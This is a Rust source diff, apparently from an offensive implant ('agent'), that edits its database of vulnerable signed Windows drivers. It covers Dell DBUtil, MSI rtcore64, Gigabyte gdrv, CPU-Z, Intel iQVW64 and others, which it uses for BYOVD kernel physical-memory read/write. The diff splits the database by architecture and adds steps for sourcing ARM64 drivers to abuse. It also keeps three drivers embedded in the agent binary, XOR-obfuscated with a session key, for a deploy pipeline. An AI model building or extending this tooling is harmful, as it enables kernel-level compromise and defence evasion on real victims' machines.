@@ -62,15 +62,26 @@ pub struct VulnerableDriver {
 
 /// The static database of known vulnerable signed drivers.
 ///
-/// Ordered by reliability and prevalence:
-/// 1. DBUtil_2_3.sys (Dell) — most widely deployed, direct phys mem R/W
-/// 2. rtcore64.sys (MSI Afterburner) — gaming PCs, direct phys mem R/W
-/// 3. gdrv.sys (Gigabyte) — direct phys mem R/W
-/// 4. ene.sys (ENE Technology) — direct phys mem R/W
-/// 5. procexp152.sys (Sysinternals Process Explorer) — direct phys mem R/W
-/// 6. cpuz141.sys (CPUID CPU-Z v1.41) — direct phys mem R/W
-/// 7. MsIo64.sys (MICSYS hardware utility) — direct phys mem R/W
-/// 8. iQVW64.SYS (Intel NIC diagnostic) — MMIO-mapped phys mem R/W
+/// Architecture-gated: x86-64 and AArch64 have different driver binaries.
+/// On x86-64, the database contains the well-known vulnerable drivers
+/// (Dell, MSI, Gigabyte, etc.). On AArch64, the database is currently
+/// empty because ARM64 Windows does not yet have widely-documented
+/// vulnerable signed drivers available in public threat-intelligence
+/// databases.
+///
+/// ARM64 Windows BYOVD status (2025):
+/// - ARM64 Windows can only load ARM64-compiled kernel drivers.
+/// - Most publicly-known vulnerable drivers (DBUtil_2_3.sys, rtcore64.sys,
+///   gdrv.sys, etc.) are x86-64 only — they will not load on ARM64.
+/// - ARM64-specific vulnerable drivers may emerge as the platform grows.
+///   Candidates include Qualcomm/Snapdragon driver packages, IoT/edge
+///   device drivers, and vendor-supplied firmware update utilities.
+/// - When an ARM64-compatible vulnerable driver is identified and verified,
+///   add it to the `AArch64` section below.
+///
+/// The deploy pipeline will gracefully degrade: if no driver is found in
+/// the database, it returns an error suggesting manual driver deployment.
+#[cfg(target_arch = "x86_64")]
 pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
     // ── Tier 1: Embedded in agent binary ──────────────────────────────
 
@@ -118,17 +129,6 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
     },
     // ── Tier 2: Reference only (not embedded) ─────────────────────────
 
-    // All three mapping types (PhysicalMemory, MmioMapping, PortIo) are now
-    // supported by deploy.rs.  MmioMapping uses {addr, size, direction} IOCTLs;
-    // PortIo uses {port, count} IOCTLs.
-    // AsIO.sys and AsIO2.sys can be re-added with PortIo mapping when a verified
-    // SHA-256 hash is available.
-
-    // BdKit.sys was removed: no verified SHA-256 hash was found after exhaustive
-    // public search (LOLDrivers, VirusTotal, KDU, Elastic, KeServiceDescriptorTable,
-    // 10+ BYOVD repos, Chinese-language searches).  Re-add when a verified hash
-    // becomes available.
-
     // ene.sys — ENE Technology driver.
     VulnerableDriver {
         name: "ene.sys",
@@ -155,9 +155,6 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         needs_physical_addr: false,
     },
     // cpuz141.sys — CPUID CPU-Z hardware profiler v1.41.
-    // Exploited for direct physical memory read/write in multiple BYOVD campaigns.
-    // IOCTL codes documented in KDU (hfiref0x) and public CVE analyses.
-    // Device created as \\Device\\cpuz141 with symlink \\DosDevices\\cpuz141.
     VulnerableDriver {
         name: "cpuz141.sys",
         device_name: "cpuz141",
@@ -170,8 +167,6 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         needs_physical_addr: false,
     },
     // MsIo64.sys — MICSYS hardware utility driver (MSI motherboard tooling).
-    // Allows direct physical memory read/write via NtDeviceIoControlFile.
-    // IOCTL codes from KDU project (hfiref0x, MIT license) and public analysis.
     VulnerableDriver {
         name: "MsIo64.sys",
         device_name: "MsIo64",
@@ -184,9 +179,6 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         needs_physical_addr: false,
     },
     // iQVW64.SYS — Intel Network Adapter Diagnostic Driver.
-    // Maps physical memory pages into user space via MmMapIoSpace.
-    // Exploited by Nobelium / LAPSUS$ and documented in Elastic BYOVD research.
-    // SHA-256 from LOLDrivers (loldrivers.io) community database.
     VulnerableDriver {
         name: "iQVW64.SYS",
         device_name: "IQVW64e",
@@ -200,10 +192,45 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
     },
 ];
 
+/// ARM64 driver database — currently empty.
+///
+/// ARM64 Windows requires ARM64-compiled kernel drivers.  The well-known
+/// BYOVD drivers (DBUtil_2_3, rtcore64, gdrv, etc.) are x86-64 only and
+/// will not load on ARM64 Windows.
+///
+/// To add ARM64 drivers:
+/// 1. Identify an ARM64-compiled signed driver with physical memory R/W.
+/// 2. Verify the SHA-256 hash against a trusted source (LOLDrivers, VirusTotal).
+/// 3. Document the IOCTL codes and mapping type.
+/// 4. Add a `VulnerableDriver` entry below.
+/// 5. Update `EMBEDDED_DRIVER_INDICES` if the driver should be embedded.
+#[cfg(target_arch = "aarch64")]
+pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
+    // ARM64-specific vulnerable drivers would go here.
+    // As of 2025, no widely-documented ARM64-compatible vulnerable signed
+    // drivers exist in public threat-intelligence databases.
+    //
+    // Potential candidates to monitor:
+    // - Qualcomm Snapdragon driver packages (firmware update utilities)
+    // - ARM64 IoT/edge device drivers (vendor-supplied)
+    // - ARM64 builds of existing tools (Process Explorer, CPU-Z) if they
+    //   ship ARM64 kernel drivers with the same vulnerable IOCTL patterns
+    //
+    // The deploy pipeline will return a clear error message when no driver
+    // is available, allowing operator-assisted manual deployment.
+];
+
 /// Index into DRIVER_DATABASE for the embedded drivers (top 3).
 /// These are XOR-obfuscated with the agent's HKDF session key and embedded
 /// via `include_bytes!` in the parent module.
+///
+/// On ARM64, there are no embedded drivers (database is empty).
+#[cfg(target_arch = "x86_64")]
 pub const EMBEDDED_DRIVER_INDICES: &[usize] = &[0, 1, 2];
+
+/// ARM64: no embedded drivers available.
+#[cfg(target_arch = "aarch64")]
+pub const EMBEDDED_DRIVER_INDICES: &[usize] = &[];
 
 /// Find a driver by name (case-insensitive).
 pub fn find_driver(name: &str) -> Option<&'static VulnerableDriver> {
